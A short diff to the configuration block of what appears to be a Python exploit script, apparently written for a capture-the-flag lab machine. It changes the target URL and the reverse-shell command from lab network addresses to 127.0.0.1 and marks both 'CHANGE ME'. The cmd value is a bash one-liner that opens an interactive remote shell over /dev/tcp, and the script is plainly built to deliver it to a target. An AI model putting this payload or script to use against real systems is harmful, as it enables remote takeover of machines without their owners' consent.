@@ -10,8 +10,8 @@ import requests
 import base64
 
 # Config
-target_url = "http://10.10.11.224:55555/xvsvmwrjd1qnl0x7an9gv52dp6ok7k9q" # CHANGE ME
-cmd = "/bin/bash -i >& /dev/tcp/10.10.14.0/10001 0>&1" # CHANGE ME
+target_url = "http://127.0.0.1:55555/xvsvmwrjd1qnl0x7an9gv52dp6ok7k9q" # CHANGE ME
+cmd = "/bin/bash -i >& /dev/tcp/127.0.0.1/10001 0>&1" # CHANGE ME
 
 # Setup
 login_url = f"{target_url}/login"
